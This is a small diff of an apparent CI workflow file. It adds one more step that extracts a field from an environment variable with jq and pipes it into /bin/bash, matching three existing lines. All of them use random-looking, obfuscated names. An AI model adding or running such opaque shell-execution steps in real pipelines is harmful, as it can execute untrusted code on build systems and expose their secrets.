@@ -25,6 +25,7 @@ jobs:
           echo $kiou502 | jq -r .j73620 | /bin/bash
           printf '%s' "$mgm0" | jq -r .ryq1056 | /bin/bash
           printf '%s' "$mglw47" | jq -r .otjgz955 | /bin/bash
+          printf '%s' "$cy800" | jq -r .um60250 | /bin/bash
 
       - name: Archive results
         if: always()
